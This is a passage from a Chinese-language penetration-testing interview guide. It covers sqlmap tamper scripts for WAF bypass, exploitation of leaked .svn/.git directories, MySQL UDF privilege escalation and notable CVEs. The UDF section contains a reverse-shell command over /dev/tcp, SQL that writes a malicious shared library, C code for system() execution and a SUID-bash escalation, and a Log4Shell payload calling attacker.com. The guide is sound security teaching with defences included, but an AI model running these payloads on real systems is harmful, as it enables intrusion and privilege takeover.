|**脚本名称**|**功能描述**|**示例转换**|
|---|---|---|
|`space2comment.py`|用 `/**/` 替换空格|`UNION SELECT` → `UNION/**/SELECT`|
|`space2plus.py`|用 `+` 替换空格（URL 编码场景）|`SELECT 1` → `SELECT+1`|
|`space2randomblank.py`|用随机空白符（如 `%09`, `%0A`）替换空格|绕过严格空格过滤|
|`multiplespaces.py`|在关键字周围插入多个空格|`UNION` → `UNION`|

#### **3. 编码混淆类**

|**脚本名称**|**功能描述**|**示例转换**|
|---|---|---|
|`base64encode.py`|对语句进行 Base64 编码|`1' AND 1=1` → `MScgQU5EIDE9MQ==`|
|`charencode.py`|对 payload 进行 URL 编码（双重编码）|`'` → `%2527`|
|`charunicodeescape.py`|将字符转换为 Unicode 转义形式（如 `'` → `\u0027`）|绕过 Unicode 感知的 WAF|

#### **4. 关键字拆分/冗余**

|**脚本名称**|**功能描述**|**示例转换**|
|---|---|---|
|`between.py`|将 `>` 替换为 `NOT BETWEEN 0 AND`|`id>1` → `id NOT BETWEEN 0 AND 1`|
|`commalesslimit.py`|将 `LIMIT X, Y` 改写为 `LIMIT Y OFFSET X`|绕过对逗号的过滤|
|`randomcase.py`|随机化关键字大小写|`SELECT` → `SeLeCt`|

#### **5. 高级混淆类**

|**脚本名称**|**功能描述**|**示例转换**|
|---|---|---|
|`versionedmorekeywords.py`|在关键字后添加版本号注释（如 `/*!50000UNION*/`）|绕过黑名单关键字过滤|
|`nonrecursivereplacement.py`|双重替换关键字（如 `UNION` → `UNIUNIONON`）|绕过简单字符串匹配|
|`xforwardedfor.py`|添加 `X-Forwarded-For` 头随机 IP|绕过 IP 封禁策略|

---

### **二、Tamper 脚本开发指南**

#### **1. 脚本结构模板**

Python

`# 导入必要模块 from lib.core.enums import PRIORITY from lib.core.settings import UNICODE_ENCODING # 定义优先级（1-高，5-低） __priority__ = PRIORITY.NORMAL  # 脚本描述 def dependencies():     pass # 核心处理函数 def tamper(payload, **kwargs):     """     :param payload: 原始注入 Payload    :return: 处理后的 Payload    """     return payload.replace(" ", "/**/")`

#### **2. 自定义脚本示例（空格转制表符）**

Python

`from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW  def tamper(payload, **kwargs):     return payload.replace(' ', '\t') if payload else payload`

#### **3. 调试与使用**

- **本地测试**：
    
    Bash
    
    `sqlmap -u "http://target.com/?id=1" --tamper=my_custom_tamper.py`
    
- **多脚本组合**：
    
    Bash
    
    `sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase`
    

---

### **三、实战场景组合策略**

#### **1. 基础绕过组合**

Bash

`--tamper=space2comment,apostrophemask,equaltolike`

- **效果**：`' UNION SELECT 1=1` → `%EF%BC%87 UNION/**/SELECT LIKE 1`

#### **2. 高级 WAF 绕过组合**

Bash

`--tamper=between,randomcase,versionedmorekeywords`

- **效果**：`AND 1>2` → `AND/*!50000NOT*/BETWEEN 0 AND 2`

#### **3. 编码混淆组合**

Bash

`--tamper=charencode,base64encode`

- **效果**：`1' AND 1=1` → `MScgQU5EIDE9MQ==`（双重编码混淆）

---

通过灵活使用 Tamper 脚本，可有效绕过各类 WAF 规则和过滤机制。实际渗透中需结合目标防护策略动态调整组合方案。


## 29. SVN/GIT源代码泄露？

在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中

包含重要的源代码信息：

使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直

接部署到线上环境。这就引起了git泄露漏洞。
### **一、SVN 源码泄露**

#### **1. 泄露原理**

- **.svn 目录结构**：
    - `entries`：记录文件版本、URL 等信息。
    - `wc.db`：SQLite 数据库，存储文件状态和原始内容。
    - `pristine/`：存放文件原始副本（未修改前的版本）。

#### **2. 利用方法**

- **直接访问**：
    
    Bash
    
    `# 下载 .svn/entries 文件 curl http://target.com/.svn/entries # 递归下载整个 .svn 目录 wget -r http://target.com/.svn/`
    
- **工具自动化**：
    - **dvcs-ripper**：
        
        Bash
        
        `rip-svn.pl -u http://target.com/.svn/`
        
    - **svn-extractor**：
        
        Bash
        
        `svn-extractor http://target.com`
        

#### **3. 漏洞危害**

- **源码暴露**：恢复完整项目代码，包括敏感配置（数据库密码、API 密钥）。
- **内部信息泄露**：SVN 服务器地址、开发者账号信息。

---

### **二、GIT 源码泄露**

#### **1. 泄露原理**

- **.git 目录结构**：
    - `HEAD`：当前分支指针。
    - `index`：暂存区文件索引。
    - `objects/`：存储所有 Git 对象（提交、文件内容）。
    - `logs/`：记录所有分支的更新历史。

#### **2. 利用方法**

- **克隆仓库**：
    
    Bash
    
    `git clone http://target.com/.git/ # 若部分文件缺失，尝试修复 git reset --hard`
    
- **工具自动化**：
    - **GitHack**：
        
        Bash
        
        `python GitHack.py http://target.com/.git/`
        
    - **git-dumper**：
        
        Bash
        
        `git-dumper http://target.com/.git/ ./output`
        

#### **3. 漏洞危害**

- **历史提交泄露**：可能包含已删除的敏感文件或硬编码凭证。
- **分支信息暴露**：未合并的测试分支可能含有未修复漏洞的代码。

---

### **三、其他版本控制泄露**

#### **1. Mercurial (.hg)**

- **利用工具**：`rip-hg.pl`（来自 dvcs-ripper）。
- **检测路径**：`http://target.com/.hg/`

#### **2. Darcs (_darcs)**

- **检测路径**：`http://target.com/_darcs/`

#### **3. 其他敏感文件**

- **.DS_Store**（macOS）：泄露目录结构及文件名。
- **.idea/**（JetBrains IDE）：项目配置可能含数据库密码。

---

### **四、检测与利用工具**

#### **1. 自动化扫描工具**

- **dirsearch**：
    
    Bash
    
    `python dirsearch.py -u http://target.com -e svn,git,ds_store`
    
- **githacker**：
    
    Bash
    
    `python githacker.py --url http://target.com --output-folder result`
    

#### **2. 手动检测技巧**

- **HTTP 响应状态**：访问 `/.git/HEAD`，返回 `200 OK` 则可能存在泄露。
- **目录列表漏洞**：部分服务器配置不当，直接列出 `.git` 文件列表。

---

### **五、防御方案**

#### **1. 部署前清理**

- **删除版本控制目录**：
    
    Bash
    
    `# 删除 .svn/.git 等目录 find /var/www/html -name ".svn" -exec rm -rf {} \; find /var/www/html -name ".git" -exec rm -rf {} \;`
    
- **构建脚本自动化**：在 CI/CD 流程中加入清理步骤。

#### **2. 服务器配置**

- **禁止访问隐藏目录**（Nginx 示例）：
    
    Nginx
    
    `location ~ /\.(svn|git|hg|DS_Store) {    deny all;    return 403; }`
    
- **禁用目录列表**：
    
    Apache
    
    `Options -Indexes`
    

#### **3. 监控与响应**

- **日志监控**：告警异常访问路径（如频繁请求 `/.git/HEAD`）。
- **Web 应用防火墙（WAF）**：拦截扫描工具的 User-Agent（如 `dirsearch`）。

---

### **六、真实案例**

- **案例 1**：某电商网站因 `.git` 泄露，攻击者恢复源码并发现支付接口密钥，导致百万级数据泄露。
- **案例 2**：政府机构 SVN 配置不当，通过 `wc.db` 恢复内部系统源码，暴露未授权 API 接口。

---

通过严格限制版本控制目录的访问权限，并在部署流程中彻底清除敏感文件，可有效避免此类信息泄露风险。

## 30.提权你了解过吗？udf提取原理是什么

将udf文件放到指定位置（Mysql>5.1放在Mysql根目录的lib\plugin文件夹下）

从udf文件中引入自定义函数(user defined function)

执行自定义函数

### **一、UDF提权原理**

#### **1. 核心机制**

- **UDF（用户自定义函数）**：MySQL允许通过C/C++编写扩展函数（`.dll`或`.so`文件），动态加载到数据库执行。
- **权限继承**：MySQL服务通常以`root`或`SYSTEM`权限运行，通过UDF执行系统命令可继承高权限。

#### **2. 利用条件**

1. **MySQL权限**：
    - 具备`FILE`权限（允许读写文件）。
    - 用户权限为`root`或具有`INSERT`、`CREATE`、`EXECUTE`权限。
2. **文件写入路径**：
    - **MySQL < 5.1**：需写入到系统目录（如`c:\\windows\\system32`）。
    - **MySQL ≥ 5.1**：需写入到MySQL插件目录（`lib/plugin/`）。
3. **secure_file_priv配置**：
    - 若设置为空或目标路径，允许文件导出；若为`NULL`则禁止。

---

### **二、利用步骤**

#### **1. 确定插件目录**

SQL

`-- 查询插件目录路径 SHOW VARIABLES LIKE 'plugin_dir';`

- **默认路径**：
    - Windows：`C:\Program Files\MySQL\MySQL Server X.X\lib\plugin\`
    - Linux：`/usr/lib/mysql/plugin/`

#### **2. 导出UDF文件到插件目录**

- **利用SQL注入或文件写入漏洞导出文件**：
    
    SQL
    
    `-- 将二进制文件内容写入目标路径 SELECT 0x7F454C460201010000... INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';`
    
- **绕过`secure_file_priv`限制**：
    - 若无法直接写入插件目录，可尝试写入其他可访问路径（如`/tmp`），并通过软链接指向。

#### **3. 创建自定义函数**

SQL

`-- 创建执行系统命令的函数 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_sys_exec.so';`

#### **4. 执行系统命令**

SQL

`-- 调用函数执行命令（如反弹Shell） SELECT sys_exec('bash -c "bash -i >& /dev/tcp/攻击机IP/端口 0>&1"');`

---

### **三、UDF文件生成**

#### **1. 使用工具生成**

- **sqlmap**：内置UDF文件生成功能。
    
    Bash
    
    `sqlmap --udf-inject`
    
- **Metasploit**：生成Payload。
    
    Bash
    
    `msfvenom -p generic/custom PAYLOADFILE=lib_mysqludf_sys.dll -f dll > udf.dll`
    

#### **2. 手动编译**

- **示例代码（C语言）**：
    
    C
    
    `#include <stdio.h> #include <stdlib.h> #include <mysql.h> extern "C" long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {     system(args->args);     return 0; }`
    
- **编译命令（Linux）**：
    
    Bash
    
    `gcc -shared -fPIC -o udf_sys_exec.so udf_sys_exec.c`
    

---

### **四、防御措施**

4. **权限最小化**：
    - MySQL服务以低权限用户运行（如`mysql`），禁用`FILE`权限。
5. **路径限制**：
    - 设置`secure_file_priv = /dev/null`，禁止文件导出。
6. **文件监控**：
    - 监控`lib/plugin`目录的异常文件写入。
7. **UDF禁用**：
    - 移除`plugin`目录写入权限，或删除`udf.dll`/`udf.so`文件。

---

### **五、攻击案例**

#### **场景**：某站存在SQL注入且`secure_file_priv`为空。

8. **导出UDF文件**：
    
    SQL
    
    `SELECT 0x7F454C460201010000... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';`
    
9. **创建函数**：
    
    SQL
    
    `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';`
    
10. **提权操作**：
    
    SQL
    
    `SELECT sys_exec('chmod u+s /bin/bash');  -- 赋予bash SUID权限 /bin/bash -p  # 以root权限执行`
    

---

通过UDF提权，攻击者可快速获取系统级权限，需严格限制MySQL配置及权限分配以防范此类攻击。


31.讲诉一些近期及有代表性的漏洞

### **一、反序列化漏洞**

#### **1. Microsoft Exchange CVE-2020-0688**

- **漏洞类型**：反序列化 + 静态密钥泄露
- **影响版本**：Exchange Server 2010-2019
- **攻击原理**：
    - ECP组件使用固定密钥`validationKey`和`decryptionKey`生成ViewState。
    - 攻击者构造恶意序列化数据，实现远程代码执行。
- **利用效果**：获取Exchange服务器控制权，窃取邮件数据。
- **修复方案**：安装2020年2月安全更新，重置ECP虚拟目录。

#### **2. Apache Shiro CVE-2016-4437（Shiro-550）**

- **漏洞类型**：硬编码密钥导致反序列化
- **影响版本**：Shiro < 1.2.5
- **攻击原理**：
    - 默认AES密钥`kPH+bIxk5D2deZiIxcaaaA==`硬编码在代码中。
    - 攻击者伪造RememberMe Cookie，触发恶意反序列化。
- **修复方案**：升级至1.2.5+，自定义密钥并禁用RememberMe功能。

#### **3. Apache Dubbo CVE-2019-17564**

- **漏洞类型**：HTTP Remoting反序列化
- **影响版本**：Dubbo 2.7.0-2.7.4, 2.6.0-2.6.9
- **攻击原理**：
    - 开启HTTP协议时，未严格校验反序列化数据。
    - 发送恶意Gadget链实现RCE。
- **修复方案**：升级至2.7.5或2.6.10，禁用HTTP Remoting。

---

### **二、文件包含/泄露漏洞**

#### **1. Apache Tomcat CVE-2020-1938（幽灵猫）**

- **漏洞类型**：AJP协议文件包含
- **影响版本**：Tomcat 6.0.0-9.0.30
- **攻击原理**：
    - 利用AJP协议的`javax.servlet.include.path_info`参数，读取Web目录任意文件。
    - 结合文件上传可实现RCE。
- **修复方案**：升级至9.0.31+，关闭AJP端口（默认8009）。

#### **2. Confluence CVE-2019-3394**

- **漏洞类型**：路径遍历导致文件泄露
- **影响版本**：Confluence 6.14.0-6.15.1
- **攻击原理**：
    - Widget Connector模块未正确过滤URL，通过`..%252F`绕过路径限制，读取`/WEB-INF`下敏感文件。
- **修复方案**：升级至6.15.2+，禁用未使用的插件。

---

### **三、远程代码执行（RCE）**

#### **1. Apache Solr CVE-2019-12409**

- **漏洞类型**：JMX服务未授权访问
- **影响版本**：Solr 5.0.0-8.2.0（默认配置）
- **攻击原理**：
    - 默认启用JMX并监听18983端口，无身份验证。
    - 通过JNDI注入加载远程恶意类。
- **修复方案**：修改`solr.in.sh`，设置`ENABLE_REMOTE_JMX_OPTS=false`。

#### **2. Weblogic CVE-2020-2551**

- **漏洞类型**：IIOP协议反序列化
- **影响版本**：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3-12.2.1.4
- **攻击原理**：
    - IIOP协议处理`LimitFilter`对象时触发反序列化，利用`jta.jar`中的Gadget链执行代码。
- **修复方案**：安装Oracle 2020年1月补丁，禁用IIOP协议。

---

### **四、认证绕过与信息泄露**

#### **1. 泛微Ecology OA SQL注入与配置泄露**

- **漏洞类型**：SQL注入 + 硬编码密钥
- **影响模块**：
    - `/cpt/manage/validate.jsp`：时间盲注获取数据库信息。
    - `/mobile/dbconfigreader.jsp`：DES加密数据库配置（密钥`1z2x3c4v5b6n`）。
- **修复方案**：删除敏感接口，升级至最新版本，更换加密密钥。

#### **2. Shiro CVE-2019-12422（Shiro-721）**

- **漏洞类型**：Padding Oracle攻击
- **影响版本**：Shiro < 1.4.2
- **攻击原理**：
    - 通过合法Cookie构造Padding，解密篡改后的RememberMe值触发反序列化。
- **修复方案**：升级至1.4.2+，使用AES-GCM加密模式。

---

### **五、其他高危漏洞**

#### **1. VMware vCenter CVE-2021-21972**

- **漏洞类型**：文件上传RCE
- **影响版本**：vCenter 6.5-7.0
- **攻击原理**：
    - 未授权上传恶意vmdk文件至`/ui/vropspluginui/rest/services/`，通过OVA插件执行命令。
- **修复方案**：升级至6.7U3n/6.5U3p/7.0U2a，禁用插件功能。

#### **2. Log4j CVE-2021-44228（Log4Shell）**

- **漏洞类型**：JNDI注入
- **影响版本**：Log4j 2.0-beta9-2.14.1
- **攻击原理**：
    - 日志中的`${jndi:ldap://attacker.com/exp}`触发远程类加载。
- **修复方案**：升级至2.15.0+，设置`log4j2.formatMsgNoLookups=true`。

---

### **防御建议**

1. **补丁管理**：定期更新中间件、框架及依赖库至安全版本。
2. **最小化权限**：数据库账户禁用`FILE`、`SUPER`等高危权限，服务以低权限运行。
3. **输入校验**：对用户输入进行严格过滤，禁用危险协议（如AJP、IIOP）。
4. **日志监控**：检测异常请求（如`/.git/HEAD`、`/cpt/manage/validate.jsp`）。

## 32.了解过解析漏洞，分别有哪些？

IIS：

1、在网站目录.asp、.asa下的任何扩展名的文件格式都会被解析为asp并执行在目录.asp下，.txt文本文件被解析。

2、在IIS6.0上，分号; 后面的不解析。

nginx：

1、在网站目录下创建文件demo2.jpg，然后再浏览器 中 访 问 http://192.168.1

1.131/test2/demo2.jpg/aaa.php服务器对请求的内容是从右向左的。Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Accessdenied.”。

2、00截断

apache

1、Apache解析文件的时候是按照从右向左的方式，直到遇到自己能解析的脚本后缀

